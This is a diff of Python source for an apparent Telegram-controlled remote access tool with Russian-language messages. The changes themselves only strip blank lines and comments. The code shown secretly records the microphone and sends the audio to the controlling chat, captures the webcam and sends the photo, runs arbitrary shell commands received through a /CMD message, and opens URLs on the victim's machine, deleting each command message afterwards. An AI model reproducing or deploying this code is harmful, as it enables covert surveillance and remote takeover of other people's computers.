@@ -1,5 +1,3 @@
-#0.01
-
 import telebot
 import os
 import re
@@ -286,23 +284,16 @@ def Audio(command):
 	#message1 = bot.send_message(message.chat.id, message.id)
 	bot.delete_message(command.chat.id, command.id)
 	try:
-
 		Seconds = re.split('/Microphone',command.text, flags=re.I)[1]
 		try:
-			#bot.send_message(command.chat.id, 'Запись...', parse_mode='Markdown')
 			File = Directory + 'Audio.wav'
-
 			Microphone(File, Seconds)
 			Audio = open(File, 'rb')
-
 			bot.send_voice(command.chat.id, Audio)
-
 		except ValueError:
 			bot.reply_to(command, 'Укажите время записи в секундах', parse_mode='Markdown')
-
 		except:
 			bot.reply_to(command, 'Микрофон не найден', parse_mode='Markdown')
-
 	except:
 		bot.send_message(command.chat.id, '🔴 Введите время в секундах /Microphone <секунды>', parse_mode='Markdown')
 
@@ -312,7 +303,6 @@ def Audio(command):
 def CMD(command):
 	bot.delete_message(command.chat.id, command.id)
 	try:
-
 		Command = re.split('/CMD ', command.text, flags=re.I)[1]
 		CMD = subprocess.Popen(Command,
 			shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
@@ -392,7 +382,6 @@ def messagewin(command):
 def Webcam(command):
 	bot.delete_message(command.chat.id, command.id)
 	try:
-
 		bot.send_chat_action(command.chat.id, 'upload_photo')
 		File = Directory + 'Webcam.jpg'
 
@@ -401,9 +390,7 @@ def Webcam(command):
 
 		WebcamScreenshot(File)
 		Webcam = open(File, 'rb')
-
 		bot.send_photo(command.chat.id, Webcam)
-
 	except:
 		bot.send_message(command, '🔴 Веб камера на обнаружена', parse_mode='Markdown')
 
@@ -417,7 +404,6 @@ def OpenUrl(command):
 		#subprocess.call('start ' + URL, shell=True)
 		wb.open(URL)
 		bot.send_message(command.chat.id, '✔ Сайт открыт', parse_mode='Markdown')
-
 	except:
 		bot.send_message(command.chat.id, '🔴 Отправьте ссылку --> /URL <ссылка>', parse_mode='Markdown')
 
